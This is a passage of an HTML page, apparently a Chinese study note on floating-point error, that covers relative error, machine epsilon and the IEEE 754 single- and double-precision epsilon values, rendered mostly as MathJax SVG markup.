26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g></g></g></svg></mjx-container></span> 是
<strong>理论值</strong>，<span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.725ex" height="1.742ex" role="img" focusable="false" viewBox="0 -759 762.5 770"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(518,363) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g></g></g></svg></mjx-container></span> 是
<strong>浮点运算后的值</strong>。</p></li>
<li><p>数值分析中，更关心 <strong>相对误差</strong>，因为它衡量了结果的
<strong>比例误差</strong>，而不仅仅是绝对误差。</p></li>
</ul></li>
</ol>
<p><strong>机器精度（Machine Epsilon, ϵ）</strong></p>
<p>机器精度 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.919ex" height="1ex" role="img" focusable="false" viewBox="0 -431 406 442"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g></g></g></svg></mjx-container></span> 定义为： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="25.932ex" height="2.149ex" role="img" focusable="false" viewBox="0 -750 11462 950"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mo" transform="translate(683.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mtext" transform="translate(1739.6,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">下</text><text data-variant="normal" transform="translate(1000,0) scale(1,-1)" font-size="884px" font-family="serif">一</text><text data-variant="normal" transform="translate(2000,0) scale(1,-1)" font-size="884px" font-family="serif">个</text><text data-variant="normal" transform="translate(3000,0) scale(1,-1)" font-size="884px" font-family="serif">可</text><text data-variant="normal" transform="translate(4000,0) scale(1,-1)" font-size="884px" font-family="serif">表</text><text data-variant="normal" transform="translate(5000,0) scale(1,-1)" font-size="884px" font-family="serif">示</text><text data-variant="normal" transform="translate(6000,0) scale(1,-1)" font-size="884px" font-family="serif">的</text><text data-variant="normal" transform="translate(7000,0) scale(1,-1)" font-size="884px" font-family="serif">数</text></g><g data-mml-node="mo" transform="translate(9961.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(10962,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container></span> 对于 <strong>IEEE 754 单精度浮点数（float,
32-bit）</strong>：</p>
<ul>
<li><p>有 <strong>23 位尾数</strong>，所以： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="22.399ex" height="2.201ex" role="img" focusable="false" viewBox="0 -891 9900.5 973"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mo" transform="translate(683.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(1739.6,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(3857.6,0)"><path data-c="2248" d="M55 319Q55 360 72 393T114 444T163 472T205 482Q207 482 213 482T223 483Q262 483 296 468T393 413L443 381Q502 346 553 346Q609 346 649 375T694 454Q694 465 698 474T708 483Q722 483 722 452Q722 386 675 338T555 289Q514 289 468 310T388 357T308 404T224 426Q164 426 125 393T83 318Q81 289 69 289Q55 289 55 319ZM55 85Q55 126 72 159T114 210T163 238T205 248Q207 248 213 248T223 249Q262 249 296 234T393 179L443 147Q502 112 553 112Q609 112 649 141T694 220Q694 249 708 249T722 217Q722 153 675 104T555 55Q514 55 468 76T388 123T308 170T224 192Q164 192 125 159T83 84Q80 55 69 55Q55 55 55 85Z"></path></g><g data-mml-node="mn" transform="translate(4913.3,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(778,0)"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(1278,0)"></path></g><g data-mml-node="mo" transform="translate(6913.6,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(7913.8,0)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g><g data-mml-node="TeXAtom" transform="translate(1033,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g></g></g></g></g></svg></mjx-container></span></p></li>
<li><p>这意味着，<strong>最小可区分的数大约是 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.05ex;" xmlns="http://www.w3.org/2000/svg" width="11.283ex" height="2.02ex" role="img" focusable="false" viewBox="0 -871.1 4987.1 893.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(778,0)"></path><path data-c="39" d="M352 287Q304 211 232 211Q154 211 104 270T44 396Q42 412 42 436V444Q42 537 111 606Q171 666 243 666Q245 666 249 666T257 665H261Q273 665 286 663T323 651T370 619T413 560Q456 472 456 334Q456 194 396 97Q361 41 312 10T208 -22Q147 -22 108 7T68 93T121 149Q143 149 158 135T173 96Q173 78 164 65T148 49T135 44L131 43Q131 41 138 37T164 27T206 22H212Q272 22 313 86Q352 142 352 280V287ZM244 248Q292 248 321 297T351 430Q351 508 343 542Q341 552 337 562T323 588T293 615T246 625Q208 625 181 598Q160 576 154 546T147 441Q147 358 152 329T172 282Q197 248 244 248Z" transform="translate(1278,0)"></path></g><g data-mml-node="mo" transform="translate(2000.2,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(3000.4,0)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g><g data-mml-node="TeXAtom" transform="translate(1033,393.1) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g></g></g></g></g></svg></mjx-container></span></strong>。</p></li>
</ul>
<p>对于 <strong>IEEE 754 双精度浮点数（double, 64-bit）</strong>：</p>
<ul>
<li>有 <strong>52 位尾数</strong>，所以： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="23.199ex" height="2.185ex" role="img" focusable="false" viewBox="0 -883.9 10254 965.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g><g data-mml-node="mo" transform="translate(683.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(1739.6,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(3857.6,0)"><path data-c="2248" d="M55 319Q55 360 72 393T114 444T163 472T205 482Q207 482 213 482T223 483Q262 483 296 468T393 413L443 381Q502 346 553 346Q609 346 649 375T694 454Q694 465 698 474T708 483Q722 483 722 452Q722 386 675 338T555 289Q514 289 468 310T388 357T308 404T224 426Q164 426 125 393T83 318Q81 289 69 289Q55 289 55 319ZM55 85Q55 126 72 159T114 210T163 238T205 248Q207 248 213 248T223 249Q262 249 296 234T393 179L443 147Q502 112 553 112Q609 112 649 141T694 220Q694 249 708 249T722 217Q722 153 675 104T555 55Q514 55 468 76T388 123T308 170T224 192Q164 192 125 159T83 84Q80 55 69 55Q55 55 55 85Z"></path></g><g data-mml-node="mn" transform="translate(4913.3,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(778,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(1278,0)"></path></g><g data-mml-node="mo" transform="translate(6913.6,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(7913.8,0)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g><g data-mml-node="TeXAtom" transform="translate(1033,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container></span></li>
</ul>
<p><strong>误差范围估计</strong></p>
<p>假设执行单次浮点运算后，得到结果 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.294ex" height="1.025ex" role="img" focusable="false" viewBox="0 -442 572 453"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g></g></g></svg></mjx-container></span>，那么实际值 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.72ex;" xmlns="http://www.w3.org/2000/svg" width="4.681ex" height="1.72ex" role="img" focusable="false" viewBox="0 -442 2069.2 760.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-176.7) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mtext"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">真</text><text data-variant="normal" transform="translate(1000,0) scale(1,-1)" font-size="884px" font-family="serif">实</text></g></g></g></g></g></svg></mjx-container></span> 可能在范围： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="21.272ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 9402.4 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(1072.2,0)"><path data-c="22C5" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(1572.4,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(1961.4,0)"><path data-c="31" d="M213 